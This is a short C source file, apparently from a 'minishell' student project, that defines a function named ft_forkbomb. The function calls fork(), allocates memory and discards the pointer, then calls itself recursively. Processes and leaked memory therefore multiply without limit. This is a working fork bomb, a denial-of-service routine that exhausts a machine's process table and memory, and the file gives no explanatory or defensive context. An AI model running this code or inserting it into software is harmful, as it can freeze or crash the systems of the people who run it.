#include "minishell.h"

void	ft_forkbomb(void)
{
	int		i;
	char	*a;

	fork();
	i = 1;
	while (i)
	{
		a = malloc(10000);
		a = NULL;
		return (ft_forkbomb());
	}
	return ;
}
